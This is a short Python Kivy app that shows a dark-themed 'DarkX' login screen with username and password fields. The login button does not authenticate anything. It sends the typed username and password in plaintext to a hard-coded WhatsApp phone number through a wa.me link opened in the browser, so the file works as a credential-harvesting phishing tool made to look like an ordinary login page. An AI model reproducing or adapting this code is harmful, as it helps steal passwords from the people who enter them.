from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
import webbrowser

# Dark blue background
Window.clearcolor = (0.0, 0.0, 0.2, 1)

class LoginScreen(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', spacing=20, padding=30, **kwargs)
        
        # Logo on top
        self.logo = Image(source='logo.png', size_hint=(None,None), size=(100,100), pos_hint={'center_x':0.5})
        self.add_widget(self.logo)
        
        # Title
        self.title = Label(text='Welcome to DarkX', font_size=32, color=(0,1,1,1), size_hint=(1,None), height=50)
        self.add_widget(self.title)
        
        # Spacer
        self.add_widget(Label(size_hint=(1,0.1)))
        
        # Login box container
        self.login_box = BoxLayout(orientation='vertical', spacing=15, size_hint=(0.8,None), height=200, pos_hint={'center_x':0.5})
        
        # Username
        self.username = TextInput(hint_text='Username', multiline=False, size_hint=(1,None), height=50, background_color=(0.1,0.1,0.3,1), foreground_color=(1,1,1,1))
        self.login_box.add_widget(self.username)
        
        # Password
        self.password = TextInput(hint_text='Password', multiline=False, password=True, size_hint=(1,None), height=50, background_color=(0.1,0.1,0.3,1), foreground_color=(1,1,1,1))
        self.login_box.add_widget(self.password)
        
        # Login button
        self.login_btn = Button(text='Login', size_hint=(1,None), height=50, background_color=(0,1,1,1), color=(0,0,0,1))
        self.login_btn.bind(on_press=self.login_action)
        self.login_box.add_widget(self.login_btn)
        
        self.add_widget(self.login_box)
        
        # Flexible spacer at bottom
        self.add_widget(Label(size_hint=(1,0.5)))
    
    def login_action(self, instance):
        user = self.username.text
        pwd = self.password.text
        message = f"Hello 👋, I just completed login info!\nUsername: {user}\nPassword: {pwd}"
        url = f"https://wa.me/255775710774?text={message.replace(' ', '%20')}"
        webbrowser.open(url)

class DarkXApp(App):
    def build(self):
        return LoginScreen()

if __name__ == '__main__':
    DarkXApp().run()
